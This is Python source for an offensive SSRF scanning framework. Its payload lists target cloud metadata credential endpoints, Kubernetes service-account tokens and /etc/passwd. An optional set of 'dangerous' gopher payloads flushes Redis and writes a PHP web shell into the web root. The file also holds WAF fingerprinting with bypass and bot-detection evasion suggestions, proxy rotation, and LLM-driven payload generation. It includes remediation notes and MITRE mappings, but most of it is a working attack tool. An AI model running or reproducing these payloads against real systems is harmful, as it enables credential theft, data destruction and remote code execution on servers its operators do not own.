#!/usr/bin/env python3

import asyncio, json, random, re, urllib.parse, os, sys, socket, argparse, time
from dataclasses import dataclass, asdict
from datetime import datetime
from typing import List, Dict, Optional, Set, Tuple
from collections import defaultdict
from pathlib import Path
from playwright.async_api import async_playwright, Response, Page

try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

try:
    from jinja2 import Template
    JINJA2_AVAILABLE = True
except ImportError:
    JINJA2_AVAILABLE = False

try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False

try:
    import networkx as nx
    NETWORKX_AVAILABLE = True
except ImportError:
    NETWORKX_AVAILABLE = False


RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"; BLUE = "\033[94m"
MAGENTA = "\033[95m"; CYAN = "\033[96m"; PURPLE = "\033[35m"; BOLD = "\033[1m"; DIM = "\033[2m"
RESET = "\033[0m"; OK = f"{GREEN}[OK]{RESET}"; WARN = f"{YELLOW}[!]{RESET}"; FAIL = f"{RED}[X]{RESET}"
AI_ICON = f"{PURPLE}[AI]{RESET}"

BANNER = f"""
{BOLD}{CYAN}
╔════════════════════════════════════════════════════════════════╗
║         ULTIMATE SSRF FRAMEWORK v5.0 – WAF-Aware Edition      ║
║    github.com/KauanCosta2000/Ultimate-ssrf-Framework          ║
║             Created by belladonnask                            ║
╚════════════════════════════════════════════════════════════════╝
{RESET}"""


DEFAULT_SSRF_PAYLOADS = [

    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",
    "http://169.254.169.254/latest/meta-data/public-keys/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://169.254.169.254/latest/meta-data/services/domain",
    "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",

    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "http://2852039166/latest/meta-data/",
    "http://0254.0254.0169.0254/latest/meta-data/",
    "http://0xa9fea9fe/latest/meta-data/",

    "http://169.254.169.254.nip.io/latest/meta-data/",
    "http://169.254.169.254.xip.io/latest/meta-data/",
    "http://metadata.nicob.net/latest/meta-data/",

    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",

    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://vault.azure.net",

    "http://100.100.100.200/latest/meta-data/",

    "http://169.254.169.254/opc/v2/instance/",

    "http://metadata.tencentyun.com/latest/meta-data/",

    "http://kubernetes.default.svc/api/v1/namespaces",
    "http://kubernetes.default.svc/apis/apps/v1/deployments",
    "https://kubernetes.default.svc/metrics",

    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://0/",
    "http://127.0.0.1.sslip.io/",
    "http://localtest.me/",
    "http://1.0.0.127.nip.io/",

    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/info",
    "ftp://127.0.0.1:21/",
    "ldap://127.0.0.1:389/",

    "file:///etc/passwd",
    "file:///var/run/secrets/kubernetes.io/serviceaccount/token",

    "http://127.0.0.1/%0d%0aX-Injected%3A%20true",
    "http://your-collaborator.com/redirect?url=http://169.254.169.254/",
]

DANGEROUS_SSRF_PAYLOADS = [
    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
    "gopher://127.0.0.1:6379/_config%20set%20dir%20/var/www/html%0d%0aconfig%20set%20dbfilename%20cmd.php%0d%0aset%20payload%20%22%3C%3Fphp%20system($_GET['cmd'])%3B%3F%3E%22%0d%0asave%0d%0a",
]

MITRE_ATTACK_LIBRARY = {
    "T1190": {
        "technique": "Exploit Public-Facing Application",
        "tactic": "Initial Access",
        "url": "https://attack.mitre.org/techniques/T1190/",
        "atomic_red_team_path": "atomics/T1190/T1190.md",
        "atomic_red_team_url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1190/T1190.md"
    },
    "T1595": {
        "technique": "Active Scanning",
        "tactic": "Reconnaissance",
        "url": "https://attack.mitre.org/techniques/T1595/",
        "atomic_red_team_path": "atomics/T1595/T1595.md",
        "atomic_red_team_url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1595/T1595.md"
    },
    "T1046": {
        "technique": "Network Service Discovery",
        "tactic": "Discovery",
        "url": "https://attack.mitre.org/techniques/T1046/",
        "atomic_red_team_path": "atomics/T1046/T1046.md",
        "atomic_red_team_url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md"
    },
    "T1552": {
        "technique": "Unsecured Credentials",
        "tactic": "Credential Access",
        "url": "https://attack.mitre.org/techniques/T1552/",
        "atomic_red_team_path": "atomics/T1552/T1552.md",
        "atomic_red_team_url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552/T1552.md"
    },
    "T1552.005": {
        "technique": "Cloud Instance Metadata API",
        "tactic": "Credential Access",
        "url": "https://attack.mitre.org/techniques/T1552/005/",
        "atomic_red_team_path": "atomics/T1552.005/T1552.005.md",
        "atomic_red_team_url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.005/T1552.005.md"
    },
    "T1528": {
        "technique": "Steal Application Access Token",
        "tactic": "Credential Access",
        "url": "https://attack.mitre.org/techniques/T1528/",
        "atomic_red_team_path": "atomics/T1528/T1528.md",
        "atomic_red_team_url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1528/T1528.md"
    },
    "T1613": {
        "technique": "Container and Resource Discovery",
        "tactic": "Discovery",
        "url": "https://attack.mitre.org/techniques/T1613/",
        "atomic_red_team_path": "atomics/T1613/T1613.md",
        "atomic_red_team_url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1613/T1613.md"
    },
    "T1059": {
        "technique": "Command and Scripting Interpreter",
        "tactic": "Execution",
        "url": "https://attack.mitre.org/techniques/T1059/",
        "atomic_red_team_path": "atomics/T1059/T1059.md",
        "atomic_red_team_url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059/T1059.md"
    }
}

REMEDIATION_LIBRARY = {
    "ssrf": [
        "Use strict allowlists for outbound destinations instead of denylisting localhost or private ranges.",
        "Normalize and parse URLs once with a safe parser before validation and before request execution.",
        "Block loopback, link-local, multicast, private IP ranges, Unix sockets and unsupported schemes after DNS resolution.",
        "Disable redirects or re-validate every redirect hop before following it.",
        "Restrict outbound egress at network level from application servers and containers."
    ],
    "cloud_metadata": [
        "Block access to 169.254.169.254, metadata.google.internal, 100.100.100.200 and cloud metadata aliases from application workloads.",
        "Require AWS IMDSv2 and set hop limit to 1 where possible.",
        "Use least-privilege instance profiles and short-lived credentials.",
        "Monitor metadata service access from application processes."
    ],
    "credential_disclosure": [
        "Remove secrets from web-accessible files and source-controlled configuration files.",
        "Move secrets to a managed secret store and rotate exposed credentials immediately.",
        "Prevent PHP/config/source files from being served or read through user-controlled paths.",
        "Add secret scanning in CI and runtime log redaction."
    ],
    "internal_discovery": [
        "Segment internal services and require authentication on admin panels and service-mesh control ports.",
        "Block server-side requests to RFC1918, loopback and link-local networks unless explicitly required.",
        "Add egress firewall rules and service-to-service policy enforcement."
    ],
    "kubernetes": [
        "Disable unnecessary service account token automounting.",
        "Apply Kubernetes NetworkPolicies to restrict pod egress.",
        "Restrict access to kubernetes.default.svc and service account token paths.",
        "Use least-privilege RBAC for workloads."
    ],
    "protocol_abuse": [
        "Allow only http and https schemes unless another scheme is explicitly required.",
        "Disable gopher, dict, ftp, file, ldap and other non-web protocols in URL fetchers.",
        "Validate scheme after decoding and normalization."
    ],
    "header_injection": [
        "Reject CRLF characters and control characters in URL inputs and headers.",
        "Use safe HTTP client libraries that prevent header injection by default.",
        "Log and alert on malformed outbound request attempts."
    ]
}


THM_LOCAL_SSRF_PAYLOADS = [
    "localhost/copyright",
    "localhost/hello",
    "localhost/config",
    "localhost/connection",
    "localhost/connection.php",
    "localhost/config.php",
    "localhost/db",
    "localhost/admin",
    "localhost/.env",
    "http://localhost/copyright",
    "http://localhost/config",
    "http://127.0.0.1/copyright",
    "http://127.0.0.1/config",
]


@dataclass
class SSRFEvidence:
    phase: str; technique: str; url: str; endpoint: str; param: str
    payload: str; status: int; body_snippet: str; matched_patterns: List[str]
    severity: str = "info"; request_headers: Optional[Dict] = None
    response_headers: Optional[Dict] = None; out_of_band_hit: bool = False
    impact_score: float = 0.0

@dataclass
class DiscoveredEndpoint:
    path: str; method: str; params: Set[str]
    accepts_url_param: bool; test_response_code: int; content_type: str

@dataclass
class ScanAttempt:
    phase: str; technique: str; target: str; tested_url: str; endpoint: str
    param: str; payload: str; status: int; vulnerable: bool = False
    result: str = "not_confirmed"; severity: str = "info"; confidence: str = "low"
    matched_patterns: Optional[List[str]] = None; error: Optional[str] = None
    body_snippet: str = ""; content_length: int = 0


def setup_argparse():
    parser = argparse.ArgumentParser(description="Ultimate SSRF Framework v5.0",
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    target_group = parser.add_mutually_exclusive_group()
    target_group.add_argument("--target", "-t")
    target_group.add_argument("--targets")
    target_group.add_argument("--target-file", "-f")
    parser.add_argument("--param", help="Specific parameter to test on a single target. Only supported with --target.")
    parser.add_argument("--path", action="append", help="Specific path to test. Can be used multiple times. Example: --path /")
    parser.add_argument("--payload", action="append", help="Custom SSRF payload to test. Can be used multiple times.")
    parser.add_argument("--payload-file", help="File containing custom payloads, one per line.")
    parser.add_argument("--url", help="Exact URL template to test. Use PAYLOAD as placeholder, example: http://host/?url=PAYLOAD")
    parser.add_argument("--lab-profile", choices=["generic", "thm", "thm-basic-ssrf"], default="generic", help="Enable lab-friendly defaults for CTF/THM targets")
    parser.add_argument("--body-snippet-size", type=int, default=1200, help="Max response body snippet stored per payload attempt")
    parser.add_argument("--callback", "-c")
    parser.add_argument("--collaborator")
    parser.add_argument("--burp-collaborator")
    parser.add_argument("--scheme", choices=["http", "https"], default="https", help="Target URL scheme to use when --target does not include http:// or https://")
    parser.add_argument("--delay", "-d", type=float, default=0.3)
    parser.add_argument("--quiet", "-q", action="store_true")
    parser.add_argument("--visible", action="store_true")
    proxy_group = parser.add_argument_group("Proxy")
    proxy_group.add_argument("--proxy", "-p")
    proxy_group.add_argument("--proxy-file")
    proxy_group.add_argument("--proxy-type", choices=["http","socks5"], default="http")
    ai_group = parser.add_argument_group("AI")
    ai_group.add_argument("--ai-provider", choices=["claude","openai","ollama","gemini","mistral","deepseek","sheep","none"])
    ai_group.add_argument("--ai-key")
    ai_group.add_argument("--ai-model")
    feature_group = parser.add_argument_group("Features")
    feature_group.add_argument("--no-waf", action="store_true")
    feature_group.add_argument("--no-websocket", action="store_true")
    feature_group.add_argument("--no-grpc", action="store_true")
    feature_group.add_argument("--no-k8s", action="store_true")
    feature_group.add_argument("--no-serverless", action="store_true")
    feature_group.add_argument("--no-graphql", action="store_true")
    feature_group.add_argument("--no-api-schema", action="store_true")
    feature_group.add_argument("--no-mesh", action="store_true")
    feature_group.add_argument("--no-bot-evasion", action="store_true")
    feature_group.add_argument("--no-ai", action="store_true")
    feature_group.add_argument("--dangerous-payloads", action="store_true")
    export_group = parser.add_argument_group("Export")
    export_group.add_argument("--export-nuclei", action="store_true")
    export_group.add_argument("--export-siem", action="store_true")
    export_group.add_argument("--export-json-api", action="store_true")
    export_group.add_argument("--attack-map", action="store_true")
    export_group.add_argument("--export-mitre", action="store_true", help="Export MITRE ATT&CK mapping and remediation guidance")
    export_group.add_argument("--output", "-o", default=".")
    return parser


class TargetManager:
    @staticmethod
    def from_args(args):
        if args.target:
            c = TargetManager._clean(args.target)
            return [c] if c else []
        if args.targets:
            return [d for d in (TargetManager._clean(x) for x in args.targets.split(',')) if d]
        if args.target_file:
            return TargetManager._from_file(args.target_file)
        return []

    @staticmethod
    def _clean(domain):
        d = domain.strip()
        if not d:
            return None
        parsed = urllib.parse.urlparse(d if "://" in d else f"//{d}")
        host = parsed.netloc or parsed.path.split("/")[0]
        scheme = parsed.scheme if parsed.scheme in ("http", "https") else None
        if not host:
            return None
        return f"{scheme}://{host}" if scheme else host

    @staticmethod
    def _from_file(path):
        targets = []
        with open(path) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    c = TargetManager._clean(line)
                    if c: targets.append(c)
        return targets

class ProxyManager:
    def __init__(self, proxy_list=None, proxy_type="http"):
        self.list = proxy_list or []
        self.ptype = proxy_type
        self.idx = 0
        self.lock = asyncio.Lock()

    @classmethod
    def from_file(cls, path, ptype="http"):
        proxies = []
        with open(path) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)
        return cls(proxies, ptype)

    async def pick(self):
        if not self.list: return None
        async with self.lock:
            p = self.list[self.idx % len(self.list)]
            self.idx += 1
            return p


def load_custom_payloads(payloads=None, payload_file=None, lab_profile="generic"):
    items = []
    default_payload_file = Path("payloads.txt")
    if lab_profile in ("thm", "thm-basic-ssrf"):
        items.extend(THM_LOCAL_SSRF_PAYLOADS)
    for payload in payloads or []:
        payload = str(payload).strip()
        if payload:
            items.append(payload)
    if payload_file is None and default_payload_file.is_file():
        payload_file = str(default_payload_file)
    if payload_file:
        with open(payload_file, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    items.append(line)
    deduped = []
    seen = set()
    for item in items:
        if item not in seen:
            seen.add(item)
            deduped.append(item)
    return deduped


SHEEP_BASE_URL = "https://sheep.byfranke.com"
SHEEP_MAX_ATTEMPTS = 3
SHEEP_TIMEOUT = 45
SHEEP_MODELS = {"auto", "scout", "hunter", "sage"}

def redact_secret(value: str) -> str:
    if not value: return value
    return re.sub(r'shp_[A-Za-z0-9_=-]+', 'shp_[REDACTED]', str(value))

class SheepAPIError(Exception): pass

class LLMClient:
    MODELS = {
        "claude": "claude-3-5-sonnet-20241022",
        "openai": "gpt-4o",
        "ollama": "llama3.1:latest",
        "gemini": "gemini-2.0-flash-exp",
        "mistral": "mistral-large-latest",
        "deepseek": "deepseek-chat",
        "sheep": "auto",
    }

    def __init__(self, provider=None, api_key=None, model=None):
        self.provider = provider
        self.api_key = api_key
        self.model = model or self.MODELS.get(provider)
        self.enabled = False
        self.last_usage = {}
        self.last_error = None

        if not provider or provider == "none" or not AIOHTTP_AVAILABLE:
            return

        if provider == "sheep":
            self.api_key = api_key or os.environ.get("SHEEP_TOKEN") or os.environ.get("SHEEP_API_TOKEN")
            self.model = self.model if self.model in SHEEP_MODELS else "auto"
            if self.api_key:
                self.enabled = True
            else:
                print(f"{WARN} Sheep API token missing.")
            return

        if provider == "ollama":
            try:
                s = socket.socket()
                s.settimeout(1)
                s.connect(("localhost", 11434))
                s.close()
                self.enabled = True
            except Exception:
                print(f"{WARN} Ollama not reachable")
            return

        if api_key:
            self.enabled = True
        else:
            print(f"{WARN} No API key for {provider}")

    async def generate(self, sys_msg, usr_msg):
        if not self.enabled: return None
        try:
            if self.provider == "claude":
                return await self._claude(sys_msg, usr_msg)
            if self.provider == "gemini":
                return await self._gemini(sys_msg, usr_msg)
            if self.provider == "ollama":
                return await self._ollama(sys_msg, usr_msg)
            if self.provider == "sheep":
                return await self._sheep(sys_msg, usr_msg)
            return await self._openai_compat(sys_msg, usr_msg)
        except Exception as e:
            self.last_error = redact_secret(str(e))
            print(f"{WARN} LLM error: {self.last_error}")
            return None

    async def _claude(self, sys_msg, usr_msg):
        headers = {"x-api-key": self.api_key, "anthropic-version": "2023-06-01", "content-type": "application/json"}
        body = {"model": self.model, "max_tokens": 4096, "system": sys_msg, "messages": [{"role":"user","content":usr_msg}]}
        async with aiohttp.ClientSession() as s:
            async with s.post("https://api.anthropic.com/v1/messages", headers=headers, json=body, timeout=60) as r:
                data = await r.json()
                return data.get("content",[{}])[0].get("text","")

    async def _openai_compat(self, sys_msg, usr_msg):
        urls = {"openai":"https://api.openai.com/v1/chat/completions",
                "mistral":"https://api.mistral.ai/v1/chat/completions",
                "deepseek":"https://api.deepseek.com/v1/chat/completions"}
        headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
        body = {"model": self.model, "messages": [{"role":"system","content":sys_msg},{"role":"user","content":usr_msg}], "max_tokens":4096}
        url = urls.get(self.provider, urls["openai"])
        async with aiohttp.ClientSession() as s:
            async with s.post(url, headers=headers, json=body, timeout=60) as r:
                data = await r.json()
                return data.get("choices",[{}])[0].get("message",{}).get("content","")

    async def _gemini(self, sys_msg, usr_msg):
        url = f"https://generativelanguage.googleapis.com/v1beta/models/{self.model}:generateContent?key={self.api_key}"
        body = {"contents":[{"parts":[{"text":f"{sys_msg}\n\n{usr_msg}"}]}]}
        async with aiohttp.ClientSession() as s:
            async with s.post(url, json=body, timeout=60) as r:
                data = await r.json()
                return data.get("candidates",[{}])[0].get("content",{}).get("parts",[{}])[0].get("text","")

    async def _ollama(self, sys_msg, usr_msg):
        body = {"model": self.model, "prompt": f"System: {sys_msg}\n\nUser: {usr_msg}\n\nAssistant:", "stream": False}
        async with aiohttp.ClientSession() as s:
            async with s.post("http://localhost:11434/api/generate", json=body, timeout=120) as r:
                data = await r.json()
                return data.get("response","")

    async def _sheep(self, sys_msg, usr_msg):
        model = self.model if self.model in SHEEP_MODELS else "auto"
        payload = {"question": f"{sys_msg}\n\n{usr_msg}", "model": model}
        headers = {"X-Sheep-Token": self.api_key, "Content-Type": "application/json",
                   "User-Agent": "ultimate-ssrf-framework/5.0"}
        timeout = aiohttp.ClientTimeout(total=SHEEP_TIMEOUT)

        for attempt in range(SHEEP_MAX_ATTEMPTS):
            try:
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    async with session.post(f"{SHEEP_BASE_URL}/api/ai/ask", headers=headers, json=payload) as response:
                        try: data = await response.json()
                        except: data = {"text": await response.text()}
                        if response.status == 200:
                            self.last_error = None
                            self.last_usage = {"provider":"sheep","model_requested":model,
                                               "served_by":data.get("served_by"),
                                               "tokens_used":data.get("tokens_used")}
                            for key in ("response","answer","content","text","result","message"):
                                val = data.get(key)
                                if isinstance(val, str) and val.strip():
                                    return val
                            return json.dumps(data, ensure_ascii=False)
                        if response.status == 429:
                            retry_after = response.headers.get("Retry-After","10")
                            try: wait_time = int(retry_after)
                            except: wait_time = 10
                            if attempt < SHEEP_MAX_ATTEMPTS-1:
                                print(f"{WARN} Sheep rate limited. Retrying in {wait_time}s")
                                await asyncio.sleep(wait_time)
                                continue
                        if 500 <= response.status < 600:
                            wait = 2**attempt
                            if attempt < SHEEP_MAX_ATTEMPTS-1:
                                print(f"{WARN} Sheep temporary error {response.status}. Retrying in {wait}s")
                                await asyncio.sleep(wait)
                                continue
                        raise SheepAPIError(f"Sheep API error {response.status}: {data.get('detail','')}")
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                wait = 2**attempt
                if attempt < SHEEP_MAX_ATTEMPTS-1:
                    print(f"{WARN} Sheep connection error. Retrying in {wait}s")
                    await asyncio.sleep(wait)
                    continue
                raise SheepAPIError(f"Sheep request failed: {redact_secret(str(e))}")
        raise SheepAPIError("Sheep request failed after retries")

class AISkills:
    def __init__(self, llm, dangerous_payloads=False):
        self.llm = llm
        self.enabled = llm and llm.enabled
        self.dangerous = dangerous_payloads
        self.last_llm_payloads = []

    async def generate_payloads(self, context: dict) -> List[str]:
        sys = (
            "Generate safe web/API validation payloads for an authorized scanner. "
            "Return only a JSON array of strings. No prose. "
            "Cover SSRF, OAST callbacks, localhost, cloud metadata read-only probes, redirects, "
            "encoded IPs, IPv6, URL parser bypasses, bad schemes, malformed URLs, webhook callback checks, "
            "read-only config paths, harmless API edge cases and endpoint error validation. "
            "No destructive payloads, command execution, credential theft, persistence, brute force or data modification."
        )
        usr = json.dumps(
            {
                "target": context.get("target"),
                "waf": context.get("waf", "none"),
                "cloud": context.get("cloud", "unknown"),
                "callback": context.get("callback_host", ""),
                "endpoints": context.get("endpoints", [])[:20],
                "params": context.get("params", [])[:30],
                "count": 20,
            },
            ensure_ascii=False,
        )
        resp = await self.llm.generate(sys, usr)
        llm_payloads = []

        if resp:
            try:
                match = re.search(r'\[.*\]', resp, re.DOTALL)
                if match:
                    parsed = json.loads(match.group())
                    if isinstance(parsed, list):
                        llm_payloads = [str(item).strip() for item in parsed if str(item).strip()]
            except Exception:
                pass

        self.last_llm_payloads = llm_payloads
        combined = DEFAULT_SSRF_PAYLOADS.copy()
        if self.dangerous:
            combined.extend(DANGEROUS_SSRF_PAYLOADS)
        for payload in llm_payloads:
            if payload not in combined:
                combined.append(payload)
        return combined[:60]

    async def suggest_additional_tests(self, context: dict) -> List[dict]:
        sys = (
            "Suggest safe non-destructive web/API security validation checks for an authorized scanner. "
            "Return only a JSON array of objects. No prose. "
            "Allowed issue_type values: ssrf, open_redirect, cors_misconfig, header_injection, "
            "host_header_injection, path_traversal_readonly, lfi_readonly, information_disclosure, "
            "debug_endpoint, exposed_config, exposed_backup_file, exposed_admin_panel, idor_review, "
            "authz_review, mass_assignment_review, api_versioning_issue, graphql_introspection, "
            "graphql_ssrf_review, jwt_misconfig_review, cache_poisoning_review, request_smuggling_review, "
            "webhook_ssrf_review, file_upload_review, redirect_uri_review, oauth_misconfig_review, "
            "cloud_metadata_review, k8s_exposure_review, service_mesh_exposure_review. "
            "Do not suggest destructive tests, brute force, credential attacks, account takeover, command execution, "
            "web shells, persistence, malware, data deletion or data modification. "
            "Each object must contain: issue_type, endpoint, param, reason, safe_test_value, expected_signal, remediation_hint. "
            "safe_test_value must be benign: marker string, callback URL, localhost read-only path, or harmless validation payload."
        )
        usr = json.dumps(
            {
                "target": context.get("target"),
                "callback_host": context.get("callback_host"),
                "endpoints": context.get("endpoints", [])[:20],
                "params": context.get("params", [])[:30],
                "waf": context.get("waf"),
                "cloud": context.get("cloud"),
                "observed_status_codes": context.get("status_codes", []),
                "observed_content_types": context.get("content_types", []),
                "known_context": context.get("known_context", ""),
            },
            indent=2,
            ensure_ascii=False,
        )
        resp = await self.llm.generate(sys, usr)
        if not resp:
            return []
        try:
            match = re.search(r'\[.*\]', resp, re.DOTALL)
            if not match:
                return []
            parsed = json.loads(match.group())
            if not isinstance(parsed, list):
                return []
            allowed = {
                "ssrf",
                "open_redirect",
                "cors_misconfig",
                "header_injection",
                "host_header_injection",
                "path_traversal_readonly",
                "lfi_readonly",
                "information_disclosure",
                "debug_endpoint",
                "exposed_config",
                "exposed_backup_file",
                "exposed_admin_panel",
                "idor_review",
                "authz_review",
                "mass_assignment_review",
                "api_versioning_issue",
                "graphql_introspection",
                "graphql_ssrf_review",
                "jwt_misconfig_review",
                "cache_poisoning_review",
                "request_smuggling_review",
                "webhook_ssrf_review",
                "file_upload_review",
                "redirect_uri_review",
                "oauth_misconfig_review",
                "cloud_metadata_review",
                "k8s_exposure_review",
                "service_mesh_exposure_review",
            }
            suggestions = []
            for item in parsed[:20]:
                if not isinstance(item, dict):
                    continue
                issue_type = str(item.get("issue_type", "")).strip().lower()
                endpoint = str(item.get("endpoint", "")).strip()
                param = str(item.get("param", "")).strip()
                reason = str(item.get("reason", "")).strip()
                safe_test_value = str(item.get("safe_test_value", "")).strip()
                expected_signal = str(item.get("expected_signal", "")).strip()
                remediation_hint = str(item.get("remediation_hint", "")).strip()
                if issue_type not in allowed:
                    continue
                if not endpoint.startswith("/"):
                    continue
                if not param:
                    continue
                suggestions.append(
                    {
                        "issue_type": issue_type,
                        "endpoint": endpoint,
                        "param": param,
                        "reason": reason,
                        "safe_test_value": safe_test_value,
                        "expected_signal": expected_signal,
                        "remediation_hint": remediation_hint,
                    }
                )
            return suggestions
        except Exception:
            return []

    async def triage(self, findings: List[dict]) -> Optional[str]:
        sys = (
            "You are a senior security analyst reviewing authorized web security scan results. "
            "Separate confirmed vulnerable items, suspected_other_issue items, manual_review items, not_confirmed attempts and errors. "
            "For confirmed SSRF issues, mention endpoint, parameter, payload, evidence, severity and recommended next steps. "
            "Never claim a target is safe when the result is only not_confirmed."
        )
        usr = json.dumps(findings[:40], indent=2, ensure_ascii=False)
        return await self.llm.generate(sys, usr)


class WAFFingerprinter:
    SIGNATURES = {
        "Cloudflare": {"headers":["cf-ray","__cfduid"],"cookies":["__cfduid","cf_clearance"],"body":["cloudflare"]},
        "AWS WAF": {"headers":["x-amz-cf-id","x-amzn-requestid"],"cookies":[],"body":["request blocked"]},
        "Akamai": {"headers":["x-akamai-transformed","x-akamai-request-id"],"cookies":["ak_bmsc"],"body":["akamai"]},
        "Fastly": {"headers":["fastly-debug-digest","x-served-by","x-cache"],"cookies":[],"body":["fastly"]},
        "Imperva": {"headers":["x-cdn","x-iinfo"],"cookies":["incap_ses_","visid_incap_"],"body":["incapsula"]},
        "F5 BIG-IP": {"headers":["x-wa-info","x-cnection"],"cookies":["f5avr","BIGipServer"],"body":["f5 networks"]},
        "Azure Front Door / WAF": {"headers":["x-azure-ref","x-ms-request-id"],"cookies":[],"body":["azure"]},
        "Google Cloud Armor": {"headers":["x-goog-"],"cookies":[],"body":["google cloud armor"]},
        "Sucuri": {"headers":["x-sucuri-id","x-sucuri-cache"],"cookies":["sucuri_cloudproxy_uuid"],"body":["sucuri"]},
        "Barracuda WAF": {"headers":["x-barracuda","x-bc-true-ip"],"cookies":["barra_counter_session"],"body":["barracuda"]},
        "Fortinet FortiWeb": {"headers":["x-fortiweb"],"cookies":["fortiwafsid"],"body":["fortiweb"]},
        "Radware AppWall": {"headers":["x-radware"],"cookies":["CloudProxy"],"body":["radware"]},
        "Citrix NetScaler / ADC WAF": {"headers":["x-citrix","x-ns-"],"cookies":["nsenc", "citrix_ns_id"],"body":[]},
        "Wallarm": {"headers":["x-wallarm"],"cookies":[],"body":["wallarm"]},
        "DataDome": {"headers":["x-datadome"],"cookies":["datadome"],"body":[]},
        "HUMAN / PerimeterX": {"headers":["x-px"],"cookies":["_px","px_captcha"],"body":["perimeterx"]},
        "Kong API Gateway (security plugins)": {"headers":["x-kong-proxy-latency","x-kong-upstream-latency"],"cookies":[],"body":[]},
        "Apigee": {"headers":["apigee"],"cookies":[],"body":["apigee"]},
        "ModSecurity / OWASP CRS": {"headers":["x-modsecurity"],"cookies":[],"body":["modsecurity","owasp"]},
    }

    BYPASS = {
        "Cloudflare": ["DNS rebinding", "IPv6 notation", "Origin IP discovery", "HTTP/2 smuggle"],
        "AWS WAF": ["IMDSv1 downgrade", "Alternative metadata IPs", "Decimal/octal IP", "Host header override"],
        "Akamai": ["Origin IP leak", "DNS pinning", "Double URL encoding", "Padding with ."],
        "Fastly": ["Spoof Host header", "Alternate DNS A record", "CRLF injection"],
        "Imperva": ["Double URL encoding", "gopher:// protocol", "Hex encoding of IP"],
        "F5 BIG-IP": ["HTTP request smuggling", "Header CRLF", "Path normalization bypass"],
        "Azure WAF": ["Request size evasion", "Unicode normalization", "Alternative metadata endpoints"],
        "Google Cloud Armor": ["Header size limit exploit", "HTTP/2 cleartext", "Multiple Host headers"],
        "ModSecurity / OWASP CRS": ["Encoding bypass (UTF-16, utf-7)", "Parameter pollution", "Long string mutation"],
        "Wallarm": ["AI-aware payload mutation", "Multiple parameters with same name", "Alternate JSON encoding"],
        "Sucuri": ["Direct origin access", "Cloudflare DNS bypass", "X-Forwarded-For spoofing"],
        "Barracuda": ["Request line folding", "Tab character injection", "HTTP/1.0 downgrade"],
        "Fortinet FortiWeb": ["Chunked encoding bypass", "Header name case switching", "Malformed POST"],
        "Radware": ["HTTP verb tampering", "HTTP/0.9 request", "Long Content-Length mismatch"],
        "Citrix ADC": ["URI smuggling", "Encoded backslash trick", "HTTP protocol version confusion"],
        "DataDome": ["Stealth Playwright (delay, human-like mouse)", "Rotate residential proxies", "Change TLS fingerprint"],
        "HUMAN / PerimeterX": ["Headless detection evasion", "Canvas fingerprint spoofing", "Spoof navigator properties"],
        "Kong / Apigee": ["Schema fuzzing", "JSON array/object injection", "Extra body parameters"],
    }

    def fingerprint(self, headers, body, cookies=None):
        cookies = cookies or {}
        headers_lower = {k.lower(): str(v).lower() for k,v in headers.items()}
        body_lower = body.lower()[:10000]
        cookie_keys = [k.lower() for k in cookies]
        results = {}
        for waf, sigs in self.SIGNATURES.items():
            score = 0; max_score = 0
            for h in sigs["headers"]:
                max_score += 2
                if any(h.lower() in hk for hk in headers_lower): score += 2
            for c in sigs["cookies"]:
                max_score += 2
                if any(c.lower() in ck for ck in cookie_keys): score += 2
            for b in sigs["body"]:
                max_score += 1
                if b in body_lower: score += 1
            if max_score > 0:
                confidence = (score/max_score)*100
                if confidence >= 20: results[waf] = confidence
        sorted_results = sorted(results.items(), key=lambda x: x[1], reverse=True)
        if sorted_results:
            return {"detected":True,"primary":sorted_results[0][0],"confidence":sorted_results[0][1],
                    "all_matches":dict(sorted_results[:3]),
                    "bypass_suggestions":self.BYPASS.get(sorted_results[0][0],[])}
        return {"detected":False,"primary":None,"confidence":0}


class UltimateSSRFFramework:
    def __init__(self, target, args):
        self.target = target
        self.lab_profile = getattr(args, "lab_profile", "generic")
        self.scheme = getattr(args, "scheme", "https")
        if self.lab_profile in ("thm", "thm-basic-ssrf") and not target.startswith(("http://", "https://")):
            self.scheme = "http"
        if target.startswith(("http://", "https://")):
            self.base = target.rstrip("/")
            parsed_target = urllib.parse.urlparse(target)
            self.target = parsed_target.netloc or target
        else:
            self.base = f"{self.scheme}://{target}".rstrip("/")
        self.cb = (args.callback or args.collaborator or args.burp_collaborator or f"{self.target}.ssrf-test.local")
        self.delay = args.delay
        self.verbose = not args.quiet
        self.headless = not args.visible
        self.user_param = getattr(args, "param", None)
        self.url_template = getattr(args, "url", None)
        self.manual_paths = self._normalize_manual_paths(getattr(args, "path", None))
